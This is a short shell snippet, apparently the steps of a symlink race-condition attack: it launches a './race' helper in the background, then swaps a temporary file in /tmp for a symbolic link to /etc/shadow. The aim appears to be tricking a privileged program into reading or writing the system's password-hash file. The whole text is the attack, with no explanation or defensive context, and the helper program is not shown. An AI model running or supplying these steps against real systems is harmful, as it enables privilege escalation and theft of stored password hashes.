rm /tmp/attack
touch /tmp/attack
./race /tmp/attack &
rm /tmp/attack
ln -s /etc/shadow /tmp/attack
sleep 1
